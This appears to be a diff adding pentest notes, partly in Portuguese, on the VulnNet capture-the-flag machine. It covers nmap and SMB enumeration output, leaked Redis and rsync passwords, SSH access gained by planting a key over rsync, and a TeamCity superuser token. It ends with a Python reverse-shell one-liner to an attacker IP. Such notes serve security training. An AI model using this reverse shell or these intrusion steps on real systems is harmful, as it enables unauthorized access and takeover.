@@ -1,0 +1,108 @@
+10.201.37.128
+
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+111/tcp   open     rpcbind
+139/tcp   open     netbios-ssn
+445/tcp   open     microsoft-ds
+873/tcp   open     rsync
+2049/tcp  open     nfs
+6379/tcp  open     redis
+9090/tcp  filtered zeus-admin
+41741/tcp open     unknown
+44693/tcp open     unknown
+52423/tcp open     unknown
+59811/tcp open     unknown
+60535/tcp open     unknown
+
+PORT      STATE    SERVICE     VERSION
+22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 65:00:1d:a1:47:81:b0:da:09:75:d0:7a:99:37:69:f5 (RSA)
+|   256 45:2f:2d:24:6a:08:bd:eb:07:76:bc:08:39:55:1c:ad (ECDSA)
+|_  256 1d:5a:d7:0d:20:f5:04:37:e7:4c:05:0f:8e:0e:eb:6b (ED25519)
+111/tcp   open     rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100005  1,2,3      37122/udp   mountd
+|   100005  1,2,3      42258/udp6  mountd
+|   100005  1,2,3      49179/tcp6  mountd
+|   100005  1,2,3      59811/tcp   mountd
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+139/tcp   open     netbios-ssn Samba smbd 4.6.2
+445/tcp   open     netbios-ssn Samba smbd 4.6.2
+873/tcp   open     rsync       (protocol version 31)
+2049/tcp  open     nfs_acl     3 (RPC #100227)
+6379/tcp  open     redis       Redis key-value store
+9090/tcp  filtered zeus-admin
+41741/tcp open     nlockmgr    1-4 (RPC #100021)
+44693/tcp open     java-rmi    Java RMI
+52423/tcp open     mountd      1-3 (RPC #100005)
+59811/tcp open     mountd      1-3 (RPC #100005)
+60535/tcp open     mountd      1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+|   <00>                 Flags: <unique><active>
+|   <03>                 Flags: <unique><active>
+|   <20>                 Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|_  WORKGROUP<1e>        Flags: <group><active>
+| smb2-time:
+|   date: 2025-08-25T00:55:04
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+
+
+
+smb enum:
+SMB         10.201.37.128   445    IP-10-201-37-128 [*] Unix - Samba (name:IP-10-201-37-128) (domain:ec2.internal) (signing:False) (SMBv1:False) (Null Auth:True)
+SMB         10.201.37.128   445    IP-10-201-37-128 [+] ec2.internal\:
+SMB         10.201.37.128   445    IP-10-201-37-128 [*] Enumerated shares
+SMB         10.201.37.128   445    IP-10-201-37-128 Share           Permissions     Remark
+SMB         10.201.37.128   445    IP-10-201-37-128 -----           -----------     ------
+SMB         10.201.37.128   445    IP-10-201-37-128 print$                          Printer Drivers
+SMB         10.201.37.128   445    IP-10-201-37-128 shares          READ            VulnNet Business Shares
+SMB         10.201.37.128   445    IP-10-201-37-128 IPC$                            IPC Service (ip-10-201-37-128 server (Samba, Ubuntu))
+
+service flag on share/temp dir.
+
+/opt/conf podendo ser montado.
+
+Senha do rediserver estava dentro do redis.conf
+requirepass "B65Hx562F@ggAZ@F"
+
+Internal flang encontrada dentro do redis.
+
+chave authlist:
+QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
+
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+
+rsync service foi usado para conseguirmos acesso ssh a ssistema, criando uma id_rsa e colocando no sistem remoteo atraves do rsync.
+
+Tentando fazer um jva-rmi enumratrion com metasploit, nao vulneravle.
+
+Pasta do TeamCity encontrada na raiz.
+
+Fiz um local port forwarding usando ssh.
+
+Arquivo de logs
+[TeamCity] Super user authentication token: 1766718408916667047 (use empty username with the token as the password to access the server)
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.66.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+
+Se aproveitando do TeamCity para upar privilegios.
